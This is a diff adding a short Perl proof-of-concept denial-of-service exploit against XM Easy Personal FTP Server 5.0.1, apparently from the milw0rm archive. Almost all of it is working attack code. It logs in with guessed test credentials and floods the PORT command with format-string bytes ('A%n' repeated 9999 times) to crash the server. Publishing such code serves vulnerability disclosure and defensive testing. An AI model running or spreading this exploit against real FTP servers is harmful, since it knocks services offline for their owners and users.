@@ -1,0 +1,31 @@
+#!/usr/bin/perl
+
+# -----------------------------------------------------------
+# Name        : XM Easy Personal FTP Server
+# Version     : 5.0.1
+# -----------------------------------------------------------
+# Type        : dos / remote
+# Multiple buffer overflows
+# Port and multiple commands with A%n, ...
+# -----------------------------------------------------------
+# Jerome Athias - https://www.securinfos.info
+# -----------------------------------------------------------
+
+use Net::FTP;
+
+$host = @ARGV[0];
+
+if ($host)
+{
+   print "\n- XM Easy Personal FTP Server 5.0.1 - PoC DoS Exploit\n-
+Jerome Athias\nhttps://www.securinfos.info";
+   $ftp = Net::FTP->new($host, Debug => 0);
+   $ftp->login('test','test'); #Maybe anonymous works ;-)
+   $ftp->port("\x41\x25\x6E"x9999);
+}
+else {
+   print "\n- XM Easy Personal FTP Server 5.0.1 - PoC DoS Exploit\n-
+Jerome Athias\nhttps://www.securinfos.info\n\n- Usage: $0 host\n";
+}
+
+# milw0rm.com [2006-06-24]
